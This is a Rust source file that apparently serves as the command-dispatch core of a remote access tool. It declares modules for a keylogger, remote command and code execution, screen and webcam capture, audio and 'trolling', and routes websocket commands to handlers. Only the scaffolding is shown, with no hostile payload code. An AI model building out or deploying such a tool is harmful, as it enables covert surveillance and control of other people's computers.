use async_trait::async_trait;
use tokio::sync::mpsc;

use tokio_tungstenite::tungstenite::Message;

pub mod audio;
pub mod chat;
pub mod file_system;
pub mod keylogger;
pub mod remote_cmd;
pub mod remote_code_execution;
pub mod remote_screen;
pub mod task_manager;
pub mod trolling;
pub mod webcam;

pub type Command = serde_json::Value;
pub type HandlerResult = anyhow::Result<()>;
// pub type _SocketWriter = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
pub type WsMessageSender = mpsc::Sender<Message>;
// pub type ArcMutexSocketWriter = Arc<Mutex<SocketWriter>>;

#[async_trait]
pub trait Actor {
    fn new() -> Self
    where
        Self: Sized;
    async fn handler(&mut self, command: Command, writer: WsMessageSender) -> HandlerResult;
}

pub fn run_actor<A: Actor + Send + 'static>(
    mut receiver: mpsc::Receiver<Command>,
    writer: WsMessageSender,
) {
    let mut actor_state = A::new();

    tokio::spawn(async move {
        while let Some(command) = receiver.recv().await {
            if let Err(e) = actor_state.handler(command, writer.clone()).await {
                eprintln!("Actor handler error: {:?}", e);
            }
        }
    });
}
